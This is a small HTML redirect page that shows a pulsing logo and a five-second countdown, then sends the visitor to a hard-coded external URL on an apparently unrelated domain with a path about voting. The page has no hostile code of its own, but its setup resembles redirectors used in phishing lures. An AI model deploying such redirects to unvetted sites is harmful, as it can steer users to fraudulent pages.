<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Redirecting...</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: grid;
      place-items: center;
      background: #0f172a;
      color: #e2e8f0;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
    }
    .wrap {
      text-align: center;
    }

    /* Logo Animation */
    .logo {
      width: 120px;
      animation: pulse 1.5s infinite ease-in-out;
    }

    @keyframes pulse {
      0% { transform: scale(1); opacity: 0.6; }
      50% { transform: scale(1.15); opacity: 1; }
      100% { transform: scale(1); opacity: 0.6; }
    }

    .text {
      margin-top: 18px;
      font-size: 16px;
    }
    .countdown {
      margin-top: 6px;
      font-size: 14px;
      opacity: 0.8;
    }
  </style>
</head>
<body>
  <div class="wrap">
    <img src="logo.jpg" class="logo" alt="Loading...">
    <div class="text">Please wait, redirecting...</div>
    <div class="countdown" id="countdown">5 seconds</div>
  </div>

  <script>
    const REDIRECT_URL = "https://alfajrcambodia.com/rhbnight/vote-performance";
    const DELAY_SECONDS = 5;

    let remaining = DELAY_SECONDS;
    const el = document.getElementById("countdown");

    const timer = setInterval(() => {
      remaining--;
      el.textContent = remaining + (remaining === 1 ? " second" : " seconds");
      if (remaining <= 0) clearInterval(timer);
    }, 1000);

    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, DELAY_SECONDS * 1000);
  </script>
</body>
</html>
